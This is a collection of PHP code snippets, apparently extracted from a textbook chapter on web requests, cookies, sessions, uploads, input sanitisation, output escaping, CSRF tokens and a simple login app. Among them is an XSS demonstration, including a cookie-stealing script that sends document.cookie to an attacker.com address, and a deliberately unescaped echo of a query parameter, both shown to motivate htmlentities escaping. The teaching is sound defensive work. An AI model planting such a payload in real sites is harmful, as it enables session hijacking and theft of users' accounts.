["```php\n<form method=\"post\" enctype=\"multipart/form-data\">\n    <input type=\"file\" name=\"myfile\" >\n    <input type=\"submit\" value=\"Upload\">\n</form>\n```", "```php\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryS8mb\n```", "```php\n<form method=\"post\" enctype=\"application/x-www-form-urlencoded\">\n    <input type=\"text\" name=\"nickname\">\n    <input type=\"submit\" value=\"Save\">\n</form>\n```", "```php\ncurl 'http://127.0.0.1:8080/form-url-encoded.php' -H 'Content-Type: application/x-www-form-urlencoded' --data 'nickname=Alex' \n```", "```php\n    <?php echo sprintf(\"<pre>%s</pre>\", print_r($_SERVER, true)); \n    ```", "```php\n    php super-server.php\n    ```", "```php\nsetcookie(\n  string $name, string $value = \"\", int $expires = 0, string $path = \"\",\n  string $domain = \"\", bool $secure = FALSE, bool $httponly = FALSE\n): bool\n// or\nsetcookie(string $name, string $value = \"\", array $options = []) : bool\n```", "```php\n    if (array_key_exists('refcode', $_GET)) {\n    // store for 30 days\n        setcookie('ref', $_GET['refcode'], time() + 60 * 60 * 24 * 30); \n    } else {\n        echo sprintf('<p>No referral code was set in query string.</p>');\n    }\n    ```", "```php\n    if (array_key_exists('refcode', $_GET)) {\n    // store for 30 days\n        setcookie('ref', $_GET['refcode'], time() + 60 * 60 * 24 * 30);\n        echo sprintf('<p>The referral code [%s] was stored in a cookie. ' .\n            'Reload the page to see the cookie value above. ' .\n            '<a href=\"super-cookie.php\">Clear the query string</a>.</p>',           $_GET['refcode']);\n    } else {\n        echo sprintf('<p>No referral code was set in query string.</p>');\n    }\n    ```", "```php\n    echo sprintf(\n        '<p>Referral code (sent by browser as cookie): [%s]</p>',       array_key_exists('ref', $_COOKIE) ? $_COOKIE['ref'] : '-None-'\n    );\n    ```", "```php\n    <form action=\"super-cookie.php\" method=\"get\">\n        <input type=\"text\" name=\"refcode\" placeholder=\"EVENT19\" value=\"EVENT19\">\n        <input type=\"submit\" value=\"Apply referral code\">\n    </form>\n    ```", "```php\n    if (!session_start()) {\n        echo 'Cannot start the session.';\n        return;\n    }\n    ```", "```php\n    $sessionName = session_name(); // PHPSESSID by default\n    ```", "```php\n    echo sprintf('<p>The cookie with session name [%s] does not exist.</p>',   $sessionName);\n    ```", "```php\n    echo sprintf(\n        '<p>A new cookie will be set for session name [%s], with value [%s]      </p>',\n        $sessionName,\n        session_id()\n    );\n    ```", "```php\n    $names = [\n        \"A-Bomb (HAS)\",\n        \"Captain America\",\n        \"Black Panther\",\n    ];\n    $chosen = $names[rand(0, 2)];\n    $_SESSION['name'] = $chosen;\n    ```", "```php\n    echo sprintf('<p>The name [%s] was picked and stored in current session.  </p>', $chosen);\n    echo sprintf('List of headers to send in response: <pre>%s</pre>',   implode(\"\\n\", headers_list()));\n    ```", "```php\n    echo sprintf('<p>The cookie with session name [%s] and value [%s] ' .\n        'is set in browser, and sent to script.</p>', $sessionName,       $_COOKIE[$sessionName]);\n    echo sprintf('<p>The current session has the following data:   <pre>%s</pre></p>', var_export($_SESSION, true));\n    ```", "```php\n    // define the data\n    $heroes = [\n        \"a-bomb\" => [\n            \"id\" => 1017100,\n            \"name\" => \"A-Bomb (HAS)\",\n        ],\n        \"captain-america\" => [\n            \"id\" => 1009220,\n            \"name\" => \"Captain America\",\n        ],\n        \"black-panther\" => [\n            \"id\" => 1009187,\n            \"name\" => \"Black Panther\",\n        ],\n    ];\n    ```", "```php\n    $selectedHero = [];\n    if (array_key_exists('hero', $_GET)) {\n        if (array_key_exists($_GET['hero'], $heroes)) {\n            $heroId = $_GET['hero'];\n            $selectedHero = $heroes[$heroId];\n        }\n    }\n    ```", "```php\n    <div style=\"background: #eee\">\n        <p>Selected hero:</p>\n        <?php if ($selectedHero) { ?>\n            <h3><?= $selectedHero['name'] ?></h3>\n            <h4>ID: <?= $selectedHero['id'] ?></h4>\n        <?php } else { ?>\n            <p>None.</p>\n        <?php } ?>\n    </div>\n    ```", "```php\n    <p>The value of $_GET is:</p>\n    <pre><?= var_export($_GET, true); ?></pre>\n    ```", "```php\n    function path(array $queryData)\n    {\n        return sprintf('./super-get-href.php?%s', http_build_      query($queryData));\n    }\n    ```", "```php\n    $heroLinks = [];\n    foreach ($heroes as $heroId => $heroData) {\n        $heroLinks[] = sprintf('<a href=\"%s\">%s</a>',       path(['hero' => $heroId]), $heroData['name']);\n    }\n    ```", "```php\n    echo sprintf('<p>%s</p>', implode(' // ', $heroLinks));\n    ```", "```php\n    // define the data\n    $heroes = [\n        \"a-bomb\" => [\n            \"id\" => 1017100,\n            \"name\" => \"A-Bomb (HAS)\",\n        ],\n        \"captain-america\" => [\n            \"id\" => 1009220,\n            \"name\" => \"Captain America\",\n        ],\n        \"black-panther\" => [\n            \"id\" => 1009187,\n            \"name\" => \"Black Panther\",\n        ],\n    ];\n    ```", "```php\n    $selectedHero = [];\n    // process the post request, if any\n    if (array_key_exists('hero', $_POST)) {\n        if (array_key_exists($_POST['hero'], $heroes)) {\n            $heroId = $_POST['hero'];\n            $selectedHero = $heroes[$heroId];\n        }\n    }\n    ```", "```php\n    <div style=\"background: #eee\">\n        <p>Selected hero:</p>\n        <?php if ($selectedHero) { ?>\n            <h3><?= $selectedHero['name'] ?></h3>\n            <h4>ID: <?= $selectedHero['id'] ?></h4>\n        <?php } else { ?>\n            <p>None.</p>\n        <?php } ?>\n    </div>\n    ```", "```php\n    <p>The value of $_POST is:</p>\n    <pre><?= var_export($_POST, true); ?></pre>\n    ```", "```php\n    <form action=\"./super-post-form.php\" method=\"post\"   enctype=\"application/x-www-form-urlencoded\">\n        <label for=\"hero_select\">Select your hero: </label>\n        <select name=\"hero\" id=\"hero_select\">\n            <?php foreach ($heroes as $heroId => $heroData) { ?>\n                <option value=\"<?= $heroId ?>\"><?= $heroData['name'] ?>              </option>\n            <?php } ?>\n        </select>\n        <input type=\"submit\" value=\"Show\">\n    </form>\n    ```", "```php\n    $uploadsDir = __DIR__ . DIRECTORY_SEPARATOR . 'uploads';\n    $targetFilename = $uploadsDir . DIRECTORY_SEPARATOR . 'my-image.png';\n    $relativeFilename = substr($targetFilename, strlen(__DIR__));\n    ```", "```php\n    if (array_key_exists('uploadFile', $_FILES)) {\n        $uploadInfo = $_FILES['uploadFile'];\n    ```", "```php\n        switch ($uploadInfo['error']) {\n            case UPLOAD_ERR_OK:\n    ```", "```php\n    mime_content_type($uploadInfo['tmp_name']); // we expect 'image/png'\n    ```", "```php\n    move_uploaded_file($uploadInfo['tmp_name'], $targetFilename);\n    ```", "```php\n    case UPLOAD_ERR_INI_SIZE:\n        echo sprintf('Failed to upload [%s]: the file is too big.',       $uploadInfo['name']);\n        break;\n    case UPLOAD_ERR_NO_FILE:\n        echo 'No file was uploaded.';\n        break;\n    ```", "```php\n    default:\n        echo sprintf('Failed to upload [%s]: error code [%d].',       $uploadInfo['name'], $uploadInfo['error']);\n        break;\n    ```", "```php\n    <form action=\"./super-post-upload.php\" method=\"post\"   enctype=\"multipart/form-data\">\n        <input type=\"file\" name=\"uploadFile\">\n        <input type=\"submit\" value=\"Upload\">\n    </form>\n    ```", "```php\n    if (file_exists($targetFilename)) {\n        // print the file\n    }\n    ```", "```php\n    echo sprintf('<img src=\"img/%s\" style=\"max-width: 500px; height: auto;\"   alt=\"my uploaded image\">', $relativeFilename);\n    ```", "```php\n    $stars = filter_input(INPUT_POST, 'stars', FILTER_SANITIZE_NUMBER_INT);\n    $message = filter_input(INPUT_POST, 'message', FILTER_SANITIZE_STRING);\n    ```", "```php\n        // first approach\n        $stars = (int)$stars;\n        if($stars < 1 || $stars > 5){\n            echo '<p>Stars can have values between 1 and 5.</p>';\n        }\n    ```", "```php\n        // or second approach\n        $stars = filter_var($stars, FILTER_VALIDATE_INT, [\n            'options' => [\n                'default' => 0, // value to return if the filter fails\n                'min_range' => 1,\n                'max_range' => 5,\n            ]\n        ]);\n        if(0 === $stars){\n            echo '<p>Stars can have values between 1 and 5.</p>';\n        }\n    ```", "```php\n    if (null === $message) {\n        //  treat the case when input does not exist\n        echo '<p>Message input is not set.</p>';\n    } elseif (false === $message) {\n        //  treat the case when the filter fails\n        echo '<p>Message failed to pass the sanitization filter.</p>';\n    }\n    ```", "```php\n    echo sprintf(\"<p>Stars: %s</p><p>Message: %s</p>\",   var_export($stars, true), var_export($message, true));\n    ```", "```php\n    <form method=\"post\">\n        <label for=\"stars\">Stars: </label><br>\n        <input type=\"text\" name=\"stars\" id=\"stars\"><br>\n        <label for=\"message\">Message: </label><br>\n        <textarea name=\"message\" id=\"message\" rows=\"10\" cols=\"40\">      </textarea><br>\n        <input type=\"submit\" value=\"Send\">\n    </form>\n    ```", "```php\necho sprintf('Search terms: %s', $_GET['s']);\n```", "```php\nSearch terms: <script>alert(1)</script>\n```", "```php\necho sprintf('Search terms: %s', htmlentities($_GET['s'], ENT_QUOTES));\n```", "```php\nSearch terms: &lt;script&gt;alert(1)&lt;/script&gt;\n```", "```php\nGreat blog post! <script>document.write('<img src=\"img/collect.gif?cookie=' + encodeURIComponent(document.cookie)+'\" />');\n</script>\n```", "```php\nGreat blogpost! &lt;script&gt;document.write('&lt;img src=&quot;https://attacker.com/collect.gif?cookie=' + encodeURIComponent(document.cookie)+'&quot; /&gt;');&lt;/script&gt;\n```", "```php\n    <?php\n    declare(strict_types=1);\n    if (isset($_GET['s'])) {\n        echo sprintf('<p>You have searched for: <strong>%s</strong>      </p>', htmlentities($_GET['s']));\n    } else {\n        echo \"Use the form to start searching.\";\n    }\n    ?>\n    ```", "```php\n    <form action=\"output-escape-reflected.php\" method=\"get\">\n        <label for=\"search\">Search term:</label>\n        <input type=\"text\" id=\"search\" name=\"s\" value=\"<?= htmlentities       ($_GET['s'] ?? '', ENT_QUOTES); ?>\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n    ```", "```php\n    session_start();\n    if (!array_key_exists('csrf-token', $_SESSION)) {\n        $_SESSION['csrf-token'] = bin2hex(random_bytes(32));\n    }\n    ```", "```php\n    if ($_SERVER['REQUEST_METHOD'] === 'POST') {\n        if (!array_key_exists('csrf-token', $_POST)) {\n            echo '<p>ERROR: The CSRF Token was not found in POST payload.          </p>';\n        } elseif ($_POST['csrf-token'] !== $_SESSION['csrf-token']) {\n            echo '<p>ERROR: The CSRF Token is not valid.</p>';\n        } else {\n            echo '<p>OK: The CSRF Token is valid. Will continue with email           validation...</p>';\n        }\n    }\n    ```", "```php\n    <form method=\"post\">\n        <label for=\"email\">New email:</label><br>\n        <input type=\"text\" name=\"email\" id=\"email\" value=\"\"><br>\n        <button type=\"submit\">Submit without CSRF Token</button>\n        <button type=\"submit\" name=\"csrf-token\">Submit with empty/invalid       CSRF Token</button>\n        <button type=\"submit\" name=\"csrf-token\" value=\"      <?php echo $_SESSION['csrf-token'] ?>\">Submit with CSRF Token\n        </button>\n    </form>\n    ```", "```php\n    main.php\n    1 <!doctype html>\n    2 <html lang=\"en\">\n    3 <head>\n    4     <meta charset=\"utf-8\">\n    5     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1,        shrink-to-fit=no\">\n    6     <title><?php echo($title ?? '(no title)'); ?></title>\n    7     <link href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/        bootstrap.min.css\" rel=\"stylesheet\">\n    8 </head>\n    https://packt.live/2Nfdqad\n    ```", "```php\n    public static $viewsPath = __DIR__ . '/../templates';\n    ```", "```php\n    private $name;\n    public function __construct(string $name)\n    {\n        $this->name = $name;\n    }\n    private function getFilepath(): string\n    {\n        return self::$viewsPath . DIRECTORY_SEPARATOR . $this->name . '.php';\n    }\n    ```", "```php\n    function render(array $data = []): string\n    {\n        extract($data, EXTR_OVERWRITE);\n        ob_start();\n        require $this->getFilepath();\n        $rendered = ob_get_clean();\n        return (string)$rendered;\n    }\n    ```", "```php\n    require_once __DIR__ . '/../src/components/Template.php';\n    $mainTemplate = new \\Components\\Template('main');\n    ```", "```php\n    $templateData = [\n        'title' => 'My main template',\n    ];\n    echo $mainTemplate->render($templateData);\n    ```", "```php\n    Handler.php\n    1  <?php\n    2  declare(strict_types=1);\n    3  \n    4  namespace Handlers;\n    5  \n    6  abstract class Handler\n    7  abstract class Handler\n    8  {\n    9      private $redirectUri = '';\n    10     abstract public function handle(): string;\n    11\n    12     public function getTitle(): string\n    13     {\n    14         return 'Learning PHP';\n    15     }\n    https://packt.live/2PahU4c\n    ```", "```php\n    <?php\n    declare(strict_types=1);\n    namespace Handlers;\n    class Login extends Handler\n    {\n        public function handle(): string\n        {\n            return (new \\Components\\Template('login-form'))->render();\n        }\n    }\n    ```", "```php\n    login-form.php\n    1 <div class=\"d-flex justify-content-center\">\n    2     <form method=\"post\" action=\"/login\" style=\"width: 100%;         max-width: 420px;\">\n    3         <div class=\"text-center mb-4\">\n    4             <h1 class=\"h3 mb-3 font-weight-normal\">Authenticate</h1>\n    5             <p>Use <code>admin</code> for both username and password.</p>\n    6         </div>\n    https://packt.live/2MA0dtk\n    ```", "```php\n    // src/components/Router.php\n    public function getHandler(): ?Handler\n    {\n        switch ($_SERVER['PATH_INFO'] ?? '/') {\n            case '/login':\n                return new Login();\n            default:\n                return null;\n        }\n    }\n    ```", "```php\n    // web/index.php\n    $router = new \\Components\\Router();\n    if ($handler = $router->getHandler()) {\n        $content = $handler->handle();\n        if ($handler->willRedirect()) {\n            return;\n        }\n        $templateData['content'] = $content;\n        $templateData['title'] = $handler->getTitle();\n    }\n    ```", "```php\n    Router.php\n    12 public function getHandler(): ?Handler\n    13 {\n    14     switch ($_SERVER['PATH_INFO'] ?? '/') {\n    15         case '/login':\n    16             return new Login();\n    17         case '/':\n    18             return null;\n    19         default:\n    20             return new class extends Handler\n    21             {\n    22                 public function handle(): string\n    23                 {\n    24                     $this->requestRedirect('/');\n    25                     return '';\n    26                 }\n    https://packt.live/32F56qK\n    Router.php\n    1 <?php declare(strict_types=1);\n    2 \n    3 namespace Components;\n    4 \n    5 use Handlers\\Handler;\n    6 use Handlers\\Login;\n    7 use Handlers\\Logout;\n    8 use Handlers\\Profile;\n    https://packt.live/35Ycxem\n    ```", "```php\n    <?php\n    declare(strict_types=1);\n    require_once __DIR__ . '/../src/components/Template.php';\n    require_once __DIR__ . '/../src/components/Router.php';\n    require_once __DIR__ . '/../src/handlers/Handler.php';\n    require_once __DIR__ . '/../src/handlers/Login.php';\n    $mainTemplate = new \\Components\\Template('main');\n    $templateData = [\n        'title' => 'My main template',\n    ];\n    $router = new \\Components\\Router();\n    if ($handler = $router->getHandler()) {\n        $content = $handler->handle();\n        if ($handler->willRedirect()) {\n            return;\n        }\n        $templateData['content'] = $content;\n        $templateData['title'] = $handler->getTitle();\n    }\n    echo $mainTemplate->render($templateData);\n    ```", "```php\n    $username = 'admin';\n    $passwordHash = '$2y$10$Y09UvSz2tQCw/454Mcuzzuo8ARAjzAGGf8OPGeBloO7j47Fb2v.  lu'; // \"admin\" password hash\n    ```", "```php\n    $formUsername = $_POST['username'] ?? '';\n    $formPassword = $_POST['password'] ?? '';\n    if ($formUsername !== $username) {\n        $formError = ['username' => sprintf('The username [%s] was not       found.', $formUsername)];\n    } elseif (!password_verify($formPassword, $passwordHash)) {\n        $formError = ['password' => 'The provided password is invalid.'];\n    }\n    ```", "```php\n    return (new \\Components\\Template('login-form'))->render([\n        'formError' => $formError,\n        'formUsername' => $formUsername ?? ''\n    ]);\n    ```", "```php\n    $_SESSION['username'] = $username;\n    $_SESSION['loginTime'] = date(\\DATE_COOKIE);\n    $this->requestRedirect('/profile');\n    ```", "```php\n    if (isset($_SESSION['username'])) {\n        $this->requestRedirect('/');\n        return '';\n    }\n    ```", "```php\n    if (!array_key_exists('username', $_SESSION)) {\n        return (new Login)->handle();\n    }\n    ```", "```php\n    return (new \\Components\\Template('profile'))->render([\n        'username' => $_SESSION['username'],\n        'sessionData' => var_export($_SESSION, true)\n    ]);\n    ```", "```php\n    public function getTitle(): string\n    {\n        return 'Profile - ' . parent::getTitle();\n    }\n    ```", "```php\n    Profile.php\n    1  <?php\n    2  declare(strict_types=1);\n    3\n    4  namespace Handlers;\n    5\n    6  class Profile extends Handler\n    7  {\n    8      public function handle(): string\n    9      {\n    10         if (!array_key_exists('username', $_SESSION)) {\n    11             return (new Login)->handle();\n    12         }\n    https://packt.live/2MzC06l\n    ```", "```php\n    <section class=\"my-5\">\n        <h4>Welcome, <?= $username ?>!</h4>\n    </section>\n    <p>Session data: </p>\n    <pre><code><?= $sessionData ?></code></pre>\n    <hr class=\"my-5\">\n    <p><a href=\"/logout\">Logout</a></p>\n    ```", "```php\n    <?php\n    declare(strict_types=1);\n    namespace Handlers;\n    class Logout extends Handler\n    {\n        public function handle(): string\n        {\n            session_regenerate_id(true);\n            session_destroy();\n            $this->requestRedirect('/');\n            return '';\n        }\n    }\n    ```", "```php\n    Router.php\n    1  <?php\n    2  declare(strict_types=1);\n    3\n    4  namespace Components;\n    5\n    6  use Handlers\\Handler;\n    7  use Handlers\\Login;\n    8  use Handlers\\Logout;\n    9  use Handlers\\Profile;\n    10 \n    11 class Router\n    https://packt.live/2BAGrYp\n    ```", "```php\n    index.php\n    1  <?php\n    2  declare(strict_types=1);\n    3\n    4  require_once __DIR__ . '/../src/components/Template.php';\n    5  require_once __DIR__ . '/../src/components/Router.php';\n    6  require_once __DIR__ . '/../src/handlers/Handler.php';\n    7  require_once __DIR__ . '/../src/handlers/Login.php';\n    8  require_once __DIR__ . '/../src/handlers/Logout.php';\n    9  require_once __DIR__ . '/../src/handlers/Profile.php';\n    10 session_start();\n    11 \n    12 $mainTemplate = new \\Components\\Template('main');\n    13 $templateData = [\n    14     'title' => 'My main template',\n    15 ];\n    https://packt.live/35XZg5O8\n    ```"]